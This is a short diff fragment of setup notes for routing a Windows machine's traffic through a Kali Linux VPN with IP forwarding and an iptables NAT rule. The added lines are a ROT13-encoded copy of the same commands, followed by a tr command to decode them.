-        sudo sysctl net.ipv4.ip_forward
-    Kali: IPTables
-        sudo iptables -t nat -A POSTROUTING -o tun0 -j  MASQUERADE
-        sudo netfilter-persistent save
-        sudo systemctl enable netfilter-persistent.service
+Jvaqbjf cebkl guebhtu Xnyv ICA
+    Jvaqbjf: Frg Fgngvp VC ba Jvaqbjf naq frg TJ gb Xnyv VC
+    Xnyv: Frg VCi4 Sbejneqvat
+        fhqb flfpgy arg.vci4.vc_sbejneq
+    Xnyv: VCGnoyrf
+        fhqb vcgnoyrf -g ang -N CBFGEBHGVAT -b gha0 -w  ZNFDHRENQR
+        fhqb argsvygre-crefvfgrag fnir
+        fhqb flfgrzpgy ranoyr argsvygre-crefvfgrag.freivpr
+        
+ tr '[N-ZA-Mn-za-m]' '[A-Za-z]'
